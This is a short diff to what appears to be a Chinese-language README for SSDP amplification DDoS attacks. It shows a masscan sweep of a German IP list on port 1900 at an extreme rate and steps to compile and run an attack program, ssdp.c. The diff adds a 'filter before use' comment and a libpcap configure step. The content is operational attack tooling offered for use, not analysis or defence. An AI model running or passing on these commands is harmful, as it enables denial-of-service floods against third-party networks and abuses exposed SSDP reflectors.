@@ -22,6 +22,7 @@
 > screen masscan -iL ip/ger_ip.txt -p1900 --rate 100000000 -oJ ip.json
 
 ### 攻击 SSDP
+	# 请自行过滤后使用!
 	# 编译攻击脚本
 	gcc -pthread ssdp.c -o ssdp
 	# SSDP 攻击
@@ -35,6 +36,7 @@
 	wget -c http://www.tcpdump.org/release/libpcap-1.9.1.tar.gz
 	tar zxf libpcap-1.9.1.tar.gz
 	cd libpcap-1.9.1
+	./configure
 	make && make install
 	ls /usr/local/lib
 	# 发现已经有了libpcap的so了
